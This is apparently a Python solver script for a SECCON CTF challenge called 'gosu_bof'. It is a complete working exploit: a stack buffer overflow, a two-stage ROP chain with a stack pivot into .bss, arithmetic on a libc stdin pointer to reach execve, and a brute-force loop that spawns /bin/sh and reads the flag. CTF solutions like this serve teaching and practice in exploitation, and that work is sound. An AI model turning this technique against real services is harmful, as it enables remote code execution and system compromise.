from ptrlib import *
import time

try:
    elf = ELF("/app/chall")
    libc = ELF("/app/libc-2.31.so")
except:
    elf = ELF("../files/gosu_bof/chall")
    libc = ELF("../files/gosu_bof/libc-2.31.so")

addr_writable = elf.section('.bss')
rop_pop_rdi = 0x004011c3
rop_pop_rbp = 0x0040111d
rop_leave = 0x00401158
rop_add_prax39h_ecx_fsave_prbpM16h_add_rsp_8h_pop_rbx_rbp_r12_r13_r14_r15 = 0x004011b0
rop_add_rbpM3Dh_ebx = 0x0040111c
rop_csu_popper = 0x4011ba
rop_csu_caller = 0x4011a0

delta = libc.symbol('execve') - libc.symbol('_IO_2_1_stdin_')

HOST = os.getenv('SECCON_HOST', 'localhost')
PORT = os.getenv('SECCON_PORT', '9002')

for i in range(256*8): # 8-bit brute force
    sock = Socket(HOST, int(PORT))
    #sock = Process("../files/gosu_bof/chall")

    payload  = b'A'*0x88
    # read 2nd stage payload
    payload += flat([
        # gets(stage2)
        rop_pop_rdi, addr_writable,
        elf.plt('gets'),
        # [rax+39h] = ecx
        rop_pop_rbp, addr_writable + 0x800,
        rop_add_prax39h_ecx_fsave_prbpM16h_add_rsp_8h_pop_rbx_rbp_r12_r13_r14_r15,
        # make execve
        0, delta, addr_writable + 0x39 + 0x3d, 12, 13, 14, 15,
        rop_add_rbpM3Dh_ebx,
        # jump to stage2
        rop_pop_rbp, addr_writable + 0x39 + 0x10 - 8,
        rop_leave
    ], map=p64)
    assert is_gets_safe(payload)
    sock.sendline(payload)

    payload  = b'A'*0x39
    payload += p64(0x00007fd300000000) # lucky number
    payload += b'/bin/sh\0'
    payload += flat([
        # execve("/bin/sh\0", 0, 0)
        rop_csu_popper,
        0, 1, addr_writable + 0x39 + 8, 0, 0, addr_writable + 0x39,
        rop_csu_caller,
    ], map=p64)
    assert is_gets_safe(payload)
    sock.sendline(payload)

    time.sleep(0.1)
    sock.sendline("echo NekoNekoPunch")
    try:
        if b'Segmentation fault' in sock.recvline(timeout=0.1):
            sock.close()
            continue
    except TimeoutError:
        sock.close()
        continue

    sock.sendline("cat flag*")
    print(sock.recvline())
    sock.close()
    break
